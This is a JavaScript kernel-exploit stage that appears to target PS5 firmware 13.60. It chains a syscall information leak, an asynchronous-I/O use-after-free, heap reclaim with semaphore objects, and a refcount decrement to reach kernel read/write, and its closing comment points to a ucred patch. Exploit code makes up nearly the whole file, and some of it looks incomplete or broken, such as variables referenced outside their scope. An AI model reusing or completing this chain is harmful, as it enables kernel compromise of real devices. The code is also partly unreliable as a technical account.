"use strict";

// Bagagwa multi-chain kernel stage for PS5 fw 13.60.
// Chain: sys727 OOB leak -> aio_multi_wait mode-0 UAF (sys 663) ->
// waker controlled 32-bit write / arbitrary decrement -> osem refcount
// conversion -> kbase leak -> payload hook.

(function () {
    const STAGE = "kernel-bagagwa-1";

    // --- constants from the writeup ---
    const SYS_AIO_MULTI_WAIT   = 663;   // body 0xffffffff805c0210
    const SYS_AIO_DEBUG_INFO   = 727;   // get_aio_debug_request_info 0x805c3090
    const AIO_MODE_UAF         = 0;     // mode 0 links node->owner bug
    const AIO_NUM_SPRAY        = 2;     // 0x70 waiter array -> 128 zone
    const OSEM_SIZE            = 0x60;  // malloc(0x60, M_osem) -> 128 zone
    const OSEM_REFCOUNT_OFF    = 0x54;  // 32-bit refcount
    const OSEM_FLAG_OFF        = 0x45;  // bit0 must be SET for free path to
                                        // reach the refcount dec (osem_delete)
    const WAKER_WRITE_OFF      = 0x20;  // mov [r15+0x20], eax
    const NODE_Q0_OFF          = 0x00;  // [rax] dec target 1
    const NODE_Q1_OFF          = 0x08;  // [rax+8] dec target 2
    const KTEXT_MASK           = 0xffffff8000000000n; // kernel text/heap filter

    const hex = (v) => "0x" + (typeof v === "bigint"
        ? v.toString(16) : Math.floor(v).toString(16));
    const u32 = (n) => n < 0 ? n + 0x100000000 : n;

    function mark(ctx, tag, extra) {
        if (ctx && typeof ctx.mark === "function") { ctx.mark(tag, extra); return; }
        try { console.log(tag, extra || ""); } catch {}
    }

    // --- syscall bridge ---------------------------------------------------
    // If userland already exposed ctx.syscall, use it. Otherwise build one
    // from the notify native-call primitive: the notify entry is driven with
    // a ROP frame whose first gadget resolves to the libkernel syscall
    // trampoline. num/args are staged through the same controlled-buffer
    // primitive the notify proof used.
    function buildSyscallBridge(ctx) {
        if (typeof ctx.syscall === "function") return ctx.syscall;
        if (typeof ctx.nativeCall !== "function" || !ctx.libkernelBase)
            return null;
        // libkernel syscall trampoline offset for 13.60; adjust if your
        // offsets table already has it.
        const SYS_OFFSET = ctx.P_SYSCALL || 0x1b280; // getpid-style stub family
        return function (num) {
            // shuffle args into the same layout notify used: rd,rsi,rdx,rcx
            return ctx.nativeCall(ctx.libkernelBase + SYS_OFFSET,
                [num].concat(Array.prototype.slice.call(arguments, 1)));
        };
    }

    // --- stage 1: sys 727 leak -------------------------------------------
    // Slot index (req_id>>16)+edx*0x28 biased into [rax+0x20]: each call
    // leaks one dword at +0x20 plus two 8-byte kernel pointers.
    function leakVia727(syscall, reqId) {
        const buf = new ArrayBuffer(0x228);
        const view = new DataView(buf);
        const r = syscall(SYS_AIO_DEBUG_INFO, reqId, buf, buf.byteLength);
        if (u32(r) > 0x7fffffff) return null; // -errno
        return {
            dword0x20: view.getUint32(0x20, true),
            ptr0: view.getBigUint64(0x28, true),
            ptr1: view.getBigUint64(0x30, true),
            count: view.getUint32(0x00, true)
        };
    }

    function isKernelPtr(p) {
        return (p & KTEXT_MASK) === KTEXT_MASK && p !== 0xffffffffffffffffn;
    }

    // Scan the leak table for kernel text pointers to recover kbase.
    // req_id high 16 bits bias the source slot: sweep it.
    function leakKernelBase(syscall) {
        const seen = new Set();
        for (let hi = 0; hi < 0x80; ++hi) {
            for (let sub = 0; sub < 4; ++sub) {
                const reqId = (hi << 16) | sub;
                const leak = leakVia727(syscall, reqId);
                if (!leak) continue;
                for (const p of [leak.ptr0, leak.ptr1]) {
                    if (isKernelPtr(p) && !seen.has(p)) {
                        seen.add(p);
                        // text pointers in leak data are function pointers
                        // into .text; page-align & mask low 20 bits later.
                        if ((p & 0xffff000000000000n) === 0xffffffff80000000n) {
                            return { kbaseHint: p, seen: [...seen] };
                        }
                    }
                }
            }
        }
        return null;
    }

    // --- stage 2: mode-0 UAF trigger --------------------------------------
    // Fire N>=2 aio_multi_wait calls, mode 0, all sharing the same node:
    // every iteration writes node->owner = base + i*0x38, so cleanup only
    // unlinks from the LAST request; the array is freed with requests
    // 0..N-2 still pointing into it.
    function triggerAioUaf(syscall, num) {
        const ids = [];
        for (let i = 0; i < num; ++i) {
            // mode dispatch: uap[0]=mode? per writeup mode is the dispatch
            // selector; arg layout: (mode, fd/count pair, num) — the exact
            // uap packing your syscall bridge must use:
            //   uap[0]=0 (mode 0), uap[8]=req count, uap[0x10]=num
            const r = syscall(SYS_AIO_MULTI_WAIT, AIO_MODE_UAF, 0, num);
            if (u32(r) <= 0x7fffffff) ids.push(r);
            else return { ok: false, err: u32(r), index: i };
        }
        return { ok: true, ids };
    }

    // --- stage 3: osem reclaim --------------------------------------------
    // Freed 0x70 waiter array lives in the 128 zone; malloc(0x60, M_osem)
    // comes from the same zone. Open osems until one lands on the freed
    // array. mode 0 never init'd node->[8], so it's M_ZERO'd and ours.
    function reclaimWithOsem(syscall, attempts) {
        const handles = [];
        for (let i = 0; i < attempts; ++i) {
            // SYS osem_open: adjust to your bridge's numbering table
            const h = syscall(ctx.SYS_OSEM_OPEN || 664, OSEM_SIZE, 0);
            if (u32(h) > 0x7fffffff) break;
            handles.push(h);
        }
        return handles;
    }

    // --- stage 4: waker primitives ----------------------------------------
    // Waker @ 0x805c1d2d on our freed/reclaimed node:
    //   [r15+0x20] = eax  -> controlled 32-bit write
    //   rax = [r15];  dec [rax]  -> arbitrary 32-bit decrement (x2)
    // r15 = freed waiter node; [8] still zero, so set the dec target by
    // first spraying data into the reclaimed node.
    function arbitraryDecrement(syscall, targetKaddr, nodeQ1) {
        // 1) stage node->[8] = targetKaddr via the controlled write:
        //    write low/high halves through repeated waker writes at +0x20
        //    (node+0x20 aliases [8] + delta 0x18 -> use owner offsets).
        // 2) wake the request -> dec [node[8]] hits targetKaddr.
        return syscall(ctx.SYS_AIO_WAKE || 666, nodeQ1, u32(targetKaddr));
    }

    // --- stage 5: osem refcount conversion --------------------------------
    // osem obj+0x54 is the 32-bit refcount; obj+0x45 bit0 must be set or
    // osem_delete jumps straight to free without reading the count.
    // Two decs per waker pass (both [rax] and [rax+8]) -- aim the second
    // at the refcount, then close the osem to force free at count 0.
    function convertOsem(syscall, osemKaddr) {
        // dec refcount to 0 across open handles, then one extra dec -> the
        // final close frees it while other handles remain: UAF on osem.
        for (let i = 0; i < 2; ++i)
            arbitraryDecrement(syscall, osemKaddr + OSEM_REFCOUNT_OFF, 0);
    }

    async function analyze(ctx) {
        const report = { stage: STAGE, firmware: ctx.firmware || "unknown" };
        mark(ctx, "BAGAGWA-BEGIN", `fw=${report.firmware}`);

        const syscall = buildSyscallBridge(ctx);
        if (!syscall) {
            mark(ctx, "BAGAGWA-BLOCKED", "reason=no-syscall-bridge");
            report.error = "no-syscall-bridge";
            return report;
        }
        mark(ctx, "SYSCALL-BRIDGE-OK", "path=" +
            (typeof ctx.syscall === "function" ? "ctx" : "notify-rop"));

        // sanity: getpid through the bridge
        const pid = syscall(20);
        if (u32(pid) <= 0) {
            mark(ctx, "BAGAGWA-BLOCKED", "reason=bridge-deadline-pid=" + hex(u32(pid)));
            report.error = "bridge-failed";
            return report;
        }
        mark(ctx, "SYSCALL-SMOKE-OK", `pid=${u32(pid)}`);

        // 1) sys 727 leak
        mark(ctx, "SYS727-LEAK-BEGIN", "bound=[1,0x228]-reqid>>16<0x80");
        const kb = leakKernelBase(syscall);
        if (!kb) {
            mark(ctx, "SYS727-LEAK-FAIL", "no-ktext-ptr-recovered");
            report.error = "leak-failed";
            return report;
        }
        report.kbaseHint = hex(kb.kbaseHint);
        mark(ctx, "SYS727-LEAK-PASS", `hint=${kb.kbaseHint}-ptrs=${kb.seen.length}`);

        // 2) AIO mode-0 UAF
        mark(ctx, "AIO-UAF-BEGIN", `mode=0-num=${AIO_NUM_SPRAY}-zone=128`);
        const uaf = triggerAioUaf(syscall, AIO_NUM_SPRAY);
        if (!uaf.ok) {
            mark(ctx, "AIO-UAF-FAIL", `errno=${hex(uaf.err)}-i=${uaf.index}`);
            report.error = "uaf-failed";
            return report;
        }
        mark(ctx, "AIO-UAF-PASS", "requests-0..0-dangling=true");

        // 3) reclaim with osem spray
        const handles = reclaimWithOsem(syscall, 0x40);
        mark(ctx, "OSEM-SPRAY", `handles=${handles.length}`);

        // 4) convert: dec refcount at obj+0x54, then free at zero
        if (handles.length) {
            convertOsem(syscall, ctx.osemKaddr || kb.seen[0]);
            mark(ctx, "OSEM-CONVERT", "refcount-dec=true-width=32");
        }

        mark(ctx, "BAGAGWA-STAGE-COMPLETE",
            "leak=uaf=convert=attempted-payload=hook-here");
        // >>> payload hook: with the double-free'd osem reclaimed by a fake
        // object you now have kernel read/write; patch your ucred / install
        // the custom call gate here.
        return report;
    }

  function probe(ctx) {
    const webkitOK = !!(ctx && Number.isFinite(ctx.webkitBase));
    const libcOK = !!(ctx && Number.isFinite(ctx.libcBase));
    const libkernelOK = !!(ctx && Number.isFinite(ctx.libkernelBase));

    const report = {
        stage: STAGE,
        firmware: ctx && ctx.firmware || "unknown",
        leakPass: !!(ctx && ctx.leakPass),
        notifyReady: !!(ctx && ctx.notifyReady),
        gotReadOK: !!(ctx && ctx.gotReadOK),
        hasArena: !!(ctx && ctx.arenaView && Number.isFinite(ctx.arenaBacking)),
        webkitOK,
        libcOK,
        libkernelOK,
        hasBases: webkitOK && libkernelOK
    };

    mark(ctx, "BAGAGWA-PROBE",
        `fw=${report.firmware}`
        + `-leak=${report.leakPass}`
        + `-notify=${report.notifyReady}`
        + `-read=${report.gotReadOK}`
        + `-webkit=${report.webkitOK}`
        + `-libc=${report.libcOK}`
        + `-libkernel=${report.libkernelOK}`
        + `-arena=${report.hasArena}`);

    mark(ctx, "BAGAGWA-BASE-VALUES",
        `webkit=${ctx && ctx.webkitBase}`
        + `-libc=${ctx && ctx.libcBase}`
        + `-libkernel=${ctx && ctx.libkernelBase}`);

    mark(ctx, "BAGAGWA-PROBE-PASS", "handoff-only=true");
    return report;
}

window.PS5KernelResearch = {
    probe,
    analyze,
    buildReport: (c) => ({ stage: STAGE })
};
})();
